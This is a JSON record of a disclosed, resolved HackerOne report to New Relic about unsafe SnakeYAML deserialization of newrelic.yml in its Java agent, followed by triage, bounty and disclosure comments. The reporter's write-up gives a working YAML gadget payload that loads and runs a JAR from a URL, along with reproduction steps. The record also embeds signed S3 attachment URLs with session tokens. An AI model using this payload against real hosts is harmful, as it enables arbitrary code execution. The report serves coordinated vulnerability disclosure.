@@ -1,0 +1,451 @@
+{
+    "id": 1109620,
+    "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMTA5NjIw",
+    "url": "https://hackerone.com/reports/1109620",
+    "title": "Untrusted deserialization issue when loading newrelic.yml file in Java agent leads to code execution on host",
+    "state": "Closed",
+    "substate": "resolved",
+    "severity_rating": "low",
+    "readable_substate": "Resolved",
+    "created_at": "2021-02-23T16:17:18.046Z",
+    "submitted_at": "2021-02-23T16:17:18.170Z",
+    "is_member_of_team?": false,
+    "is_organization_group_member?": false,
+    "reporter": {
+        "disabled": false,
+        "username": "j0v",
+        "url": "/j0v",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+        },
+        "is_me?": false,
+        "cleared": false,
+        "verified": false,
+        "hackerone_triager": false,
+        "hacker_mediation": false
+    },
+    "team": {
+        "id": 17011,
+        "url": "https://hackerone.com/newrelic",
+        "handle": "newrelic",
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+            "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "permissions": [],
+        "submission_state": "open",
+        "default_currency": "usd",
+        "awards_miles": false,
+        "offers_bounties": true,
+        "state": "public_mode",
+        "only_cleared_hackers": false,
+        "pentest_feature_enabled?": false,
+        "profile": {
+            "name": "New Relic",
+            "twitter_handle": "newrelic",
+            "website": "https://newrelic.com",
+            "about": "New Relic's Coordinated Disclosure Program"
+        }
+    },
+    "has_bounty?": true,
+    "in_validation?": false,
+    "can_view_team": true,
+    "can_view_report": true,
+    "is_external_bug": false,
+    "is_published": false,
+    "is_participant": false,
+    "has_collaborators": false,
+    "submitted_by_team_member": false,
+    "stage": 4,
+    "public": true,
+    "visibility": "full",
+    "cve_ids": [],
+    "singular_disclosure_disabled": true,
+    "disclosed_at": "2021-06-28T13:00:14.824Z",
+    "bug_reporter_agreed_on_going_public_at": "2021-06-21T13:30:57.843Z",
+    "team_member_agreed_on_going_public_at": "2021-06-28T13:00:14.675Z",
+    "comments_closed?": false,
+    "facebook_team?": false,
+    "team_private?": false,
+    "vulnerability_information": "Hi team,\n\nThe New Relic Java agent is using SnakeYAML for deserialization of the `newrelic.yml` config file. SnakeYAML has a 'feature' which can lead to code execution, this is documented [here](https://bitbucket.org/asomov/snakeyaml/wiki/Documentation#markdown-header-constructors-representers-resolvers). With the `!!com.some.Class [\"arg1\", \"arg2\"]` notation it's possible to call Java code during the deserialization of a YAML file. \nIt's possible to combine this with a common known exploit using the `javax.script.ScriptEngineManager`, more info about this can be found in the paper and PoC tool of marshalsec, which can be found here: https://github.com/mbechler/marshalsec.\n\nI created a PoC locally and was able to execute code on my local machine. You can reproduce this with the following steps:\n\n* You can follow the steps here: https://github.com/jordyv/yaml-payload to create the necessary files for the exploit or used the files in the attachment. I added a ZIP file with all the files I created for my PoC as attachment to this report. My custom code is in `PocScriptEngineFactory.java` and as PoC I called `ping` to my localhost and started the MacOSX Calculator app.  I called the JAR file `poc.jar`.\n* Host the file locally, for example with `python3 -m http.server`, which starts a local webserver at port 8000\n* Update the newrelic.yml. I used the `common.labels` section for my payload, but it can be placed anywhere. \n\n```\ncommon: &default_settings\n  # ...\n  labels:\n    test: !!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [ \"http://localhost:8000/poc.jar\" ]]]]\n```\n\n* Start a Java application with the `newrelic.jar` as agent; `java -javaagent:libs/newrelic.jar -jar build/libs/newrelic-agent-test-1.0-SNAPSHOT.jar`\n* In your HTTP server you'll notice a request to poc.jar and the code gets executed\n\n\nA video for this PoC: F1206678\nAll my files: F1206688\n\nThe ZIP file in the attachments also contains a README.md with the default steps.\n\n## Impact\n\nBy using SnakeYAML without any safe configuration it's possible for a malicious user to execute arbitrary code at the host by updating the newrelic.yml file. The actual arbitrary code can be hosted externally so at the local side it's only needed to place a payload with the URL of a JAR file in the agent configuration file.",
+    "bounty_amount": "768.0",
+    "formatted_bounty": "$768",
+    "weakness": {
+        "id": 52,
+        "name": "Deserialization of Untrusted Data"
+    },
+    "original_report_id": null,
+    "original_report_url": null,
+    "attachments": [
+        {
+            "id": 1206678,
+            "file_name": "poc_newrelic_agent_rce.mp4",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/xnd6p5w9vw7rhxgw1uvfniyh0mu4?response-content-disposition=attachment%3B%20filename%3D%22poc_newrelic_agent_rce.mp4%22%3B%20filename%2A%3DUTF-8%27%27poc_newrelic_agent_rce.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070955Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1bdee56fa2ee9cdc7281e09aec59f115b7d3342a9aa5a4682aa7cf5c2e8b5099",
+            "file_size": 551676,
+            "type": "video/mp4"
+        },
+        {
+            "id": 1206688,
+            "file_name": "poc_files.zip",
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/po91c1lzd8kkj29lmowr7kxo10dv?response-content-disposition=attachment%3B%20filename%3D%22poc_files.zip%22%3B%20filename%2A%3DUTF-8%27%27poc_files.zip&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070955Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2ec642b700c08a8414e77ba0053505e9d193ffd3febea8a187c3c37894921cc9",
+            "file_size": 15163935,
+            "type": "application/zip"
+        }
+    ],
+    "allow_singular_disclosure_at": "2021-07-21T13:30:58.043Z",
+    "allow_singular_disclosure_after": -66418737.55923334,
+    "singular_disclosure_allowed": true,
+    "vote_count": 39,
+    "voters": [
+        "mr-medi",
+        "osman1337",
+        "n1m0",
+        "bombon",
+        "sklnhunt",
+        "cryptoknight028",
+        "rreiss",
+        "s_p_q_r",
+        "ali",
+        "skavans",
+        "and 29 more..."
+    ],
+    "severity": {
+        "rating": "low",
+        "author_type": "Team"
+    },
+    "structured_scope": {
+        "databaseId": 16327,
+        "asset_type": "DOWNLOADABLE_EXECUTABLES",
+        "asset_identifier": "Java agent",
+        "max_severity": "critical"
+    },
+    "abilities": {
+        "assignable_team_members": [],
+        "assignable_team_member_groups": []
+    },
+    "activities": [
+        {
+            "id": 10757443,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "I'm not sure if my previous video was clear enough so I also created one with the steps while running a simple Java application in IntelliJ. This time I used the 'app_name' configuration as placeholder for the payload.\nAll the code is in the ZIP file (attachment F1206688).\n\nNew video: F1206753",
+            "automated_response": false,
+            "created_at": "2021-02-23T17:28:54.869Z",
+            "updated_at": "2021-02-23T17:28:54.869Z",
+            "actor": {
+                "username": "j0v",
+                "cleared": false,
+                "verified": false,
+                "url": "/j0v",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "attachments": [
+                {
+                    "id": 1206753,
+                    "filename": "poc_newrelic_agent_rce_3.mp4",
+                    "type": "video/mp4",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/x425kkg8v36tz91rh81o2evytl7q?response-content-disposition=attachment%3B%20filename%3D%22poc_newrelic_agent_rce_3.mp4%22%3B%20filename%2A%3DUTF-8%27%27poc_newrelic_agent_rce_3.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070955Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=47a64287ea8764463e90cf01c275f34bbd3e5d0ce408be1727503fa4c7401e04"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 10757917,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hey @j0v Thanks for your report. I was able to reproduce your findings in your PoC. I will need to perform some additional tests to pinpoint exactly where the vulnerability stems from in our NR agent.  ",
+            "automated_response": false,
+            "created_at": "2021-02-23T18:18:31.748Z",
+            "updated_at": "2021-02-23T18:18:31.748Z",
+            "actor": {
+                "username": "rprast",
+                "cleared": false,
+                "verified": false,
+                "url": "/rprast",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 10765611,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @rprast,\n\nThanks for your response. \nThe main problem is the use of the SnakeYAML library which parses the YAML file. During the `YAML.load()` call it will parse these `!!com.package.Class []` YAML values and it will initiate Java objects. Some Java classes will directly execute code during the construction. There are more of these Java 'gadgets', you can find a list and more info at the following sources:\n- https://github.com/mbechler/marshalsec/blob/master/marshalsec.pdf - info about how it works (original paper of the researcher)\n- https://github.com/frohoff/ysoserial - probably some of these can also be used\n- https://securitylab.github.com/research/swagger-yaml-parser-vulnerability - Info about this vulnerability in the Swagger YAML parser\n\nIf you need more info, please let me know :-).",
+            "automated_response": false,
+            "created_at": "2021-02-24T09:36:49.810Z",
+            "updated_at": "2021-02-24T09:36:49.810Z",
+            "actor": {
+                "username": "j0v",
+                "cleared": false,
+                "verified": false,
+                "url": "/j0v",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 10769514,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportSeverityUpdated",
+            "message": null,
+            "automated_response": false,
+            "created_at": "2021-02-24T15:44:01.056Z",
+            "updated_at": "2021-02-24T15:44:01.056Z",
+            "additional_data": {
+                "old_severity": "Medium (5.9)",
+                "new_severity": "Low",
+                "old_severity_id": 993427,
+                "new_severity_id": 994225
+            },
+            "actor": {
+                "username": "rprast",
+                "cleared": false,
+                "verified": false,
+                "url": "/rprast",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 10769569,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugTriaged",
+            "message": "@j0v  Thanks for the follow up comment. I was able to confirm the bug in your PoC and on internal tests. Overall this is a great catch and a wonderful example of how reading documentation is always necessary. \n\nWe ultimately decided on a `Low` rating since an attacker would need access to a victims system and then additionally have enough privileges to write to the .yaml file. However, your report was well unique, well written and easy to follow so we will include an additional bonus on top of the the normal bounty amount. \n\nWe appreciate your report and hope to see more from you in the future.  ",
+            "automated_response": false,
+            "created_at": "2021-02-24T15:49:07.366Z",
+            "updated_at": "2021-02-24T15:49:07.366Z",
+            "actor": {
+                "username": "rprast",
+                "cleared": false,
+                "verified": false,
+                "url": "/rprast",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 10769596,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BountyAwarded",
+            "message": "Congrats, now take some money!\n{F1207901}",
+            "automated_response": false,
+            "created_at": "2021-02-24T15:51:06.744Z",
+            "updated_at": "2021-02-24T15:51:06.744Z",
+            "actor": {
+                "url": "/newrelic",
+                "ibb": false,
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "profile": {
+                    "name": "New Relic"
+                }
+            },
+            "bounty_amount": "512.0",
+            "bonus_amount": "256.0",
+            "bounty_currency": "usd",
+            "attachments": [
+                {
+                    "id": 1207901,
+                    "filename": "cash.gif",
+                    "type": "image/gif",
+                    "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/1wfm96lql7nedg9dfvtgav9qjm4f?response-content-disposition=attachment%3B%20filename%3D%22cash.gif%22%3B%20filename%2A%3DUTF-8%27%27cash.gif&response-content-type=image%2Fgif&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQVJW3J6EC%2F20230829%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230829T070955Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjENf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCWT1ruwqc2oByytevVo%2BJwP5CuUSNHvk0vuHjxZNpbLwIgOeoSnb%2FmdjXdZewytaps5XSg7IBiDxrlnkPD4i4CPYQqugUIoP%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDLBJNUdbbKZCYT0C9iqOBfQku%2B5Azcmj5AdB26nMf2ktZjuwR6Yf4mPl5dRw8xv2hbew%2FoTfHwa8uWbUsVP9%2BQ665LZktOXNtzcEk9YLJjsfltqCGOMjArmHXmO7DtjVZe3bT0CMddibsG2oRFE7MeZylLi%2FFLZ0h%2FkP2bvhv3QlPoZkzCfXnpogf2P7rP%2F0GFJYUV1cisHR6KFbgfW66l2YxBzZ2V2Df9C3KnNChUUzRLCYvb7MEp4KqRsH1CLheeBdqqLc8BtygBE77gETUQ07bkoOeLsyiEpR%2FZoTIjptSkwBiumi7HuDADkKTm%2F6pA4pVvOmQpAGJX8LEjG3R0lNEknX5P2pyl%2FfQjUhY5caRl%2B5vA0schYyxRSTFl8K1qZKq3N5P8dYZGoaPL9mth2MpCbpA0sIP5P0AYL98nH8Jqj%2FWth%2Fea29XnC4psIkWAzWSPN0jZYIKoEoViHFRgO6yQHL9xCuF7ynS8W4LG4hV6L3AW%2Bwp57nG66Z5psn2lNXAFrWQ8VINXw83pZi6oX%2FPggl3B6CXC421yVsNhkVCBquvicjntQ0w0a0JyNhxZG%2BJuNFjoxgmgxcd4LjTLj4w0y8lklVezsXkk2oz%2FPzNfZ0nL7YublRW5M7zRIiVMSYxPiaLA2x9wkpm5T2HXRNb0g0DTEwU04WhLxx4s6qhC%2BNOqyzXZGnkSfurTs469C%2Ftknm5s6rloLtHob%2FmnmYTsvKGxwm8akqMvmt9Bvr8yfEipq%2BKofcRExYGv5YVdhx9YfKPpflQz%2FnkY61%2BuKWWSLYWeB%2BLuh44oQ3vSiVtc5u%2F%2FtdEHzv6REX2VBOzT4LqaXBd9rktSPvodB8%2B5xFqRdmFj%2F6E2XkiyFiX0KLK9YixTtIXOs7FnoxcjCtrLanBjqxAUPHVGDrO9%2F7ASqx4OaO99QIBf0eY2DXvMOeQvwnrwFxMpGyyzIg5MV%2F1oK4cuDnvJtz%2F3K6XMfkdEUx1qDm1nXD%2B17RHnlMaiK0PeA3%2BHeYHE7yUoNYIF6%2B8LYu4P31sIBrZXX4seXS4n1KOzFO%2Bhlx1O%2Bs4ih71Ivq0Qs%2F6ETyi7f6yaW%2B9BTt9hM5qGA0MOAHq7RTE7Txq3kubk4%2F5o5CjZ%2FqtgPwlnf0oWR9sY%2B8hw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=10e833c0ad0d65f0a9e0922b56f0e1f0d47927355e78f26c9e20de9d63dc7604"
+                }
+            ],
+            "genius_execution_id": null,
+            "team_handle": "newrelic",
+            "collaborator": {
+                "username": "j0v",
+                "url": "/j0v"
+            }
+        },
+        {
+            "id": 10770531,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Thanks for the reward and the compliments about my report, I really appreciate that :-). \nIs there a chance to disclose a summary about this report once it is resolved? ",
+            "automated_response": false,
+            "created_at": "2021-02-24T17:40:10.142Z",
+            "updated_at": "2021-02-24T17:40:10.142Z",
+            "actor": {
+                "username": "j0v",
+                "cleared": false,
+                "verified": false,
+                "url": "/j0v",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 10771288,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::Comment",
+            "message": "Hi @j0v,\n\nAs this is a lower priority issue, it may be some time before this is completed, but you're welcome to request disclosure as soon as this is marked Resolved. We're happy to share the report in its entirety or you can write up a summary when the time comes.",
+            "automated_response": false,
+            "created_at": "2021-02-24T17:55:19.602Z",
+            "updated_at": "2021-02-24T17:55:19.602Z",
+            "actor": {
+                "username": "nr-dm",
+                "cleared": false,
+                "verified": false,
+                "url": "/nr-dm",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 11811656,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::BugResolved",
+            "message": "Hey @j0v , this issue has been fixed in the latest release of the Java agent. Thanks for your report! ",
+            "automated_response": false,
+            "created_at": "2021-05-19T20:48:33.725Z",
+            "updated_at": "2021-05-19T20:48:33.725Z",
+            "actor": {
+                "username": "rprast",
+                "cleared": false,
+                "verified": false,
+                "url": "/rprast",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "reporter": {
+                "username": "j0v",
+                "url": "/j0v"
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 12190422,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-06-21T13:30:57.962Z",
+            "updated_at": "2021-06-21T13:30:57.962Z",
+            "first_to_agree": true,
+            "actor": {
+                "username": "j0v",
+                "cleared": false,
+                "verified": false,
+                "url": "/j0v",
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/variants/9MwzMPq6b3gY9VoVUmCo7F28/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 12271081,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::AgreedOnGoingPublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-06-28T13:00:14.708Z",
+            "updated_at": "2021-06-28T13:00:14.708Z",
+            "actor": {
+                "username": "nr-dm",
+                "cleared": false,
+                "verified": false,
+                "url": "/nr-dm",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
+                "hackerone_triager": false,
+                "hackerone_employee": false
+            },
+            "genius_execution_id": null,
+            "team_handle": "newrelic"
+        },
+        {
+            "id": 12271082,
+            "is_internal": false,
+            "editable": false,
+            "type": "Activities::ReportBecamePublic",
+            "message": "",
+            "automated_response": false,
+            "created_at": "2021-06-28T13:00:14.874Z",
+            "updated_at": "2021-06-28T13:00:14.874Z",
+            "actor": {
+                "username": "nr-dm",
+                "cleared": false,
+                "verified": false,
+                "url": "/nr-dm",
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
+                },
